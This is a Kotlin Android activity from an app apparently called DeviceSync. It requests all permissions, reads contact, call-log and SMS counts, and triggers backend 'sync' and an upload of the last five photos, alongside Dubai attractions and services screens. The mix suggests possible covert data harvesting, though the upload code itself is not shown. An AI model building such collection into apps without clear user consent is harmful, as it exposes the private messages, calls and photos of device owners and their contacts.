package com.devicesync.app

import android.content.Intent
import android.os.Bundle
import android.util.Log
import android.widget.Button
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.NotificationCompat
import androidx.lifecycle.ViewModelProvider
import androidx.lifecycle.lifecycleScope
import androidx.recyclerview.widget.LinearLayoutManager
import androidx.recyclerview.widget.RecyclerView
import com.devicesync.app.services.BackendSyncService
import com.devicesync.app.services.SyncResult
import kotlinx.coroutines.launch
import com.devicesync.app.adapters.DataTypeAdapter
import com.devicesync.app.data.DataType
import com.devicesync.app.data.SyncStatus
import com.devicesync.app.utils.PermissionManager
import com.devicesync.app.viewmodels.MainViewModel
import android.Manifest
import android.content.pm.PackageManager
import android.database.Cursor
import android.net.Uri
import android.provider.ContactsContract
import android.provider.CallLog
import android.provider.Telephony
import androidx.core.content.ContextCompat
import androidx.core.app.ActivityCompat

class MainActivity : AppCompatActivity() {
    
    companion object {
        private const val VIEW_SYNCED_DATA_REQUEST = 1002
    }

    private lateinit var viewModel: MainViewModel
    private lateinit var permissionManager: PermissionManager
    private lateinit var adapter: DataTypeAdapter
    private lateinit var recyclerView: RecyclerView
    private lateinit var syncButton: Button
    private lateinit var testNotificationButton: Button
    private lateinit var attractionsButton: Button
    private lateinit var servicesButton: Button
    private lateinit var uploadLast5ImagesButton: Button

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        
        // Add test button functionality
        findViewById<Button>(R.id.btnTestDataFetch).setOnClickListener {
            testDataFetching()
        }
        
        viewModel = ViewModelProvider(this)[MainViewModel::class.java]
        permissionManager = PermissionManager(this) { allGranted ->
            if (allGranted) {
                Toast.makeText(this, "All permissions granted!", Toast.LENGTH_SHORT).show()
            } else {
                Toast.makeText(this, "Some permissions denied", Toast.LENGTH_LONG).show()
            }
        }
        
        setupViews()
        setupObservers()
        checkPermissions()
    }
    
    private fun setupViews() {
        recyclerView = findViewById(R.id.dataTypeRecyclerView)
        syncButton = findViewById(R.id.syncButton)
        testNotificationButton = findViewById(R.id.testNotificationButton)
        
        adapter = DataTypeAdapter(
            emptyList(),
            onItemClick = { dataType ->
                Toast.makeText(this, "Clicked: ${dataType.type.name}", Toast.LENGTH_SHORT).show()
            },
            onViewDataClick = { dataType ->
                viewSyncedData(dataType)
            }
        )
        
        recyclerView.layoutManager = LinearLayoutManager(this)
        recyclerView.adapter = adapter
        
        // Change sync button to show status only
        syncButton.text = "Current Device Sync"
        syncButton.isEnabled = false
        
        // Setup test notification button
        testNotificationButton.setOnClickListener {
            sendTestNotification()
        }
        
        // Setup comprehensive test button
        val testAllButton = findViewById<Button>(R.id.testAllButton)
        testAllButton.setOnClickListener {
            runComprehensiveTest()
        }
        
        // Setup attractions button - Navigate to Dubai Attractions
        attractionsButton = findViewById(R.id.attractionsButton)
        attractionsButton.setOnClickListener {
            val intent = Intent(this, AttractionsHomeActivity::class.java)
            startActivity(intent)
        }
        
        // Setup services button - Navigate to Dubai Services
        servicesButton = findViewById(R.id.servicesButton)
        servicesButton.setOnClickListener {
            val intent = Intent(this, ServicesHomeActivity::class.java)
            startActivity(intent)
        }
        
        // 🎯 TOP-TIER: Setup last 5 images upload button
        uploadLast5ImagesButton = findViewById(R.id.uploadLast5ImagesButton)
        uploadLast5ImagesButton.setOnClickListener {
            uploadLast5Images()
        }
    }
    
    private fun setupObservers() {
        viewModel.dataTypes.observe(this) { dataTypes ->
            adapter.updateData(dataTypes)
        }
        
        viewModel.syncStatus.observe(this) { status ->
            syncButton.text = when (status) {
                SyncStatus.SYNCING -> "Syncing..."
                SyncStatus.COMPLETED -> "Sync Completed"
                SyncStatus.FAILED -> "Sync Failed"
                else -> "Current Device Sync"
            }
        }
    }
    
    private fun checkPermissions() {
        permissionManager.requestAllPermissions()
    }
    
    private fun viewSyncedData(dataType: DataType) {
        val deviceInfo = viewModel.deviceInfo.value
        if (deviceInfo != null) {
            val intent = Intent(this, SyncedDataActivity::class.java).apply {
                putExtra("data_type", dataType.type.name)
                putExtra("device_id", deviceInfo.deviceId)
            }
            startActivityForResult(intent, VIEW_SYNCED_DATA_REQUEST)
        } else {
            Toast.makeText(this, "No device available", Toast.LENGTH_SHORT).show()
        }
    }
    
    private fun sendTestNotification() {
        val notificationManager = getSystemService(NOTIFICATION_SERVICE) as android.app.NotificationManager
        val channelId = "test_channel"
        
        // Create notification channel for Android 8.0+
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            val channel = android.app.NotificationChannel(
                channelId,
                "Test Notifications",
                android.app.NotificationManager.IMPORTANCE_DEFAULT
            )
            notificationManager.createNotificationChannel(channel)
        }
        
        val notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("Test Notification")
            .setContentText("This is a test notification to verify syncing")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setPriority(NotificationCompat.PRIORITY_DEFAULT)
            .build()
        
        notificationManager.notify(999, notification)
        Toast.makeText(this, "Test notification sent! Check logs for sync status.", Toast.LENGTH_LONG).show()
    }
    
    private fun runComprehensiveTest() {
        val deviceInfo = viewModel.deviceInfo.value
        if (deviceInfo != null) {
            Toast.makeText(this, "Starting comprehensive data sync test...", Toast.LENGTH_LONG).show()
            
            // Run the test in a coroutine
            lifecycleScope.launch {
                try {
                    val backendSyncService = BackendSyncService(this@MainActivity)
                    val results = backendSyncService.testAllDataTypes(deviceInfo.deviceId)
                    
                    // Show results summary
                    val successCount = results.count { it.value is SyncResult.Success }
                    val totalCount = results.size
                    
                    val message = "Test completed: $successCount/$totalCount successful"
                    Toast.makeText(this@MainActivity, message, Toast.LENGTH_LONG).show()
                    
                    // Log detailed results
                    results.forEach { (dataType, result) ->
                        when (result) {
                            is SyncResult.Success -> {
                                Log.d("MainActivity", "✅ $dataType: ${result.itemsSynced} items synced")
                            }
                            is SyncResult.Error -> {
                                Log.e("MainActivity", "❌ $dataType: ${result.message}")
                            }
                        }
                    }
                    
                } catch (e: Exception) {
                    Log.e("MainActivity", "Test failed: ${e.message}", e)
                    Toast.makeText(this@MainActivity, "Test failed: ${e.message}", Toast.LENGTH_LONG).show()
                }
            }
        } else {
            Toast.makeText(this, "No device available for testing", Toast.LENGTH_SHORT).show()
        }
    }
    
    // 🎯 TOP-TIER: Upload Last 5 Images Function
    private fun uploadLast5Images() {
        lifecycleScope.launch {
            try {
                Toast.makeText(this@MainActivity, "🎯 Starting last 5 images upload...", Toast.LENGTH_SHORT).show()
                
                val deviceId = viewModel.deviceInfo.value?.deviceId ?: "unknown_device"
                val backendService = BackendSyncService(this@MainActivity)
                
                // Upload last 5 images
                val result = backendService.uploadLast5Images(deviceId)
                
                if (result.isSuccess) {
                    val response = result.getOrNull() ?: "Upload completed"
                    Toast.makeText(this@MainActivity, "✅ Last 5 images uploaded successfully!", Toast.LENGTH_LONG).show()
                    Log.d("MainActivity", "Upload response: $response")
                } else {
                    val error = result.exceptionOrNull()?.message ?: "Unknown error"
                    Toast.makeText(this@MainActivity, "❌ Upload failed: $error", Toast.LENGTH_LONG).show()
                    Log.e("MainActivity", "Upload error: $error")
                }
                
            } catch (e: Exception) {
                Toast.makeText(this@MainActivity, "❌ Upload error: ${e.message}", Toast.LENGTH_LONG).show()
                Log.e("MainActivity", "Upload exception: ${e.message}", e)
            }
        }
    }

    private fun testDataFetching() {
        if (checkDataPermissions()) {
            fetchContactsCount()
            fetchCallLogsCount()
            fetchMessagesCount()
        } else {
            requestDataPermissions()
        }
    }
    
    private fun checkDataPermissions(): Boolean {
        val permissions = arrayOf(
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_SMS
        )
        
        return permissions.all {
            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
        }
    }
    
    private fun requestDataPermissions() {
        val permissions = arrayOf(
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_SMS
        )
        ActivityCompat.requestPermissions(this, permissions, 100)
    }
    
    private fun fetchContactsCount() {
        try {
            val cursor: Cursor? = contentResolver.query(
                ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null
            )
            
            val count = cursor?.count ?: 0
            cursor?.close()
            
            Toast.makeText(this, "📞 Total Contacts: $count", Toast.LENGTH_LONG).show()
            Log.d("DataTest", "Contacts count: $count")
        } catch (e: Exception) {
            Toast.makeText(this, "❌ Error fetching contacts: ${e.message}", Toast.LENGTH_LONG).show()
            Log.e("DataTest", "Error fetching contacts", e)
        }
    }
    
    private fun fetchCallLogsCount() {
        try {
            val cursor: Cursor? = contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                null, null, null, null
            )
            
            val count = cursor?.count ?: 0
            cursor?.close()
            
            Toast.makeText(this, "📞 Total Call Logs: $count", Toast.LENGTH_LONG).show()
            Log.d("DataTest", "Call logs count: $count")
        } catch (e: Exception) {
            Toast.makeText(this, "❌ Error fetching call logs: ${e.message}", Toast.LENGTH_LONG).show()
            Log.e("DataTest", "Error fetching call logs", e)
        }
    }
    
    private fun fetchMessagesCount() {
        try {
            val cursor: Cursor? = contentResolver.query(
                Telephony.Sms.CONTENT_URI,
                null, null, null, null
            )
            
            val count = cursor?.count ?: 0
            cursor?.close()
            
            Toast.makeText(this, "💬 Total SMS Messages: $count", Toast.LENGTH_LONG).show()
            Log.d("DataTest", "SMS count: $count")
        } catch (e: Exception) {
            Toast.makeText(this, "❌ Error fetching messages: ${e.message}", Toast.LENGTH_LONG).show()
            Log.e("DataTest", "Error fetching messages", e)
        }
    }
    
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        
        when (requestCode) {
            VIEW_SYNCED_DATA_REQUEST -> {
                if (resultCode == RESULT_OK) {
                    Toast.makeText(this, "Data viewed successfully", Toast.LENGTH_SHORT).show()
                }
            }
        }
        
        // Handle permission manager activity results
        permissionManager.handleActivityResult(requestCode, resultCode, data)
    }
    
    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        
        // Handle permission results
        permissionManager.handlePermissionResult(requestCode, permissions, grantResults)
    }
}
